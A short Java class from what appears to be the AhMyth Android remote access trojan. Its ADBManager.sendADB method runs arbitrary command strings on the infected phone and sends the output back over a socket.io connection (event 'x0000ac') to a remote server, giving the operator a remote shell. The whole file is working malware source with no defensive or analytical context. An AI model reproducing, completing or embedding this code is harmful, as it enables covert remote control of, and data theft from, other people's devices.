package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;


public class ADBManager {

    public static void sendADB(String commandLine) {
        try {
            Process process;
            process = Runtime.getRuntime().exec(commandLine);

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String read;
            StringBuilder output=new StringBuilder();
            while ((read = reader.readLine())!=null){
                output.append(read);
                output.append("\n");
                Log.v("lalo executed command ", output.toString());
            }
            reader.close();
            process.waitFor();

            JSONObject object = new JSONObject();
            object.put("response",output.toString() );

            Log.w("lalo", "response: " + object);

            IOSocket.getInstance().getIoSocket().emit("x0000ac" , object);
        } catch (Exception e) {
            e.printStackTrace();
            Log.w("lalo", "EX: " + e.toString());
        }
    }





}
